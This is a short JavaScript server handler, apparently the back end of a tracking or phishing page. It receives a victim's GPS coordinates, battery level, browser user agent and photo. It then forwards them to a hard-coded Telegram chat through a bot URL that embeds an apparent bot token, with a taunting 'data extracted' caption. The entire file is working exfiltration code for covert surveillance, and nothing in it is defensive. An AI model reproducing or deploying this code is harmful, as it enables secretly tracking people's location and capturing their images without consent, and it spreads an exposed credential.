export default async function handler(req, res) {
  if(req.method!=='POST') return res.status(405).end();
  
  try{
    const formData=await req.formData();
    const gps=formData.get('gps');
    const bat=formData.get('bat');
    const ua=formData.get('ua');
    const photo=formData.get('photo');
    
    const msg=`╭┈┈⬡「 🎣 ᴅᴀᴛᴀ ᴇxᴛʀᴀᴄᴛᴇᴅ 」
┃ ◦ ᴛᴇʀᴄʏᴅᴜᴋ ᴋᴀᴜ Suki 😹
┃ ◦ ━━━━━━━━━━━━━━━━━━━
┃ ◦ 🆔 ɪᴅ: NX_${Math.random().toString(36).substr(2,8).toUpperCase()}
┃ ◦ 📍 GPS: ${gps}
┃ ◦ 📱 Device: ${ua.slice(0,40)}...
┃ ◦ 🔋 Battery: ${bat}
┃ ◦ 🕐 Time: ${new Date().toLocaleString('id-ID')}
╰┈┈⬡ ━━━━━━━━━━━━━━━━━━━`;
    
    // SEND PHOTO + CAPTION
    const teleForm=new FormData();
    teleForm.append('chat_id','7349944283');
    teleForm.append('photo',photo||'https://i.ibb.co.com/Mw10bGf/IMG-20260328-WA0012.jpg');
    teleForm.append('caption',msg);
    
    await fetch('https://api.telegram.org/bot8651759192:AAGAHKMB_vgP7SrlLUGmDtyboaasI9lwZpA/sendPhoto',{
      method:'POST',body:teleForm
    });
    
    res.status(200).json({success:true});
  }catch(e){
    res.status(500).json({error:e.message});
  }
}